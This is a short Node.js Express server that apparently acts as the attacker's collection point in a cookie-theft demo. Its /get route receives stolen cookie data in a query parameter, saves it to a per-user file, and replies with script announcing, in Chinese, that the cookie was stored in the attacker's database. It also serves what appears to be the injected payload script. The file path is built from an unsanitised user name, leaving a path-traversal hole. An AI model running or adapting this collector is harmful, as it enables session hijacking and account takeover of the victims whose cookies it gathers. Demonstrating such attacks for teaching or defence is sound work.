const express = require('express')
const app = express();
var fs = require("fs");
app.use("/example",express.static('example'))
app.use("/dist",express.static('dist'))
app.all("/",function(req,res){
    res.location('/example/a.js');
    res.send(302);
})
app.get("/get",function(req,res){
    console.log(req.query["c"].substr(17));
    var a = JSON.parse(req.query["c"].substr(17));
    fs.writeFile('./user/'+a.userName+'.txt', JSON.stringify(a,null,2),function(err){
        if(err) console.log('写文件操作失败');
        else console.log('写文件操作成功');
        res.send("console.log('cookie信息已存入攻击者数据库！')");
    });
})
app.listen(80, () => console.log('Example app listening on port 80!'))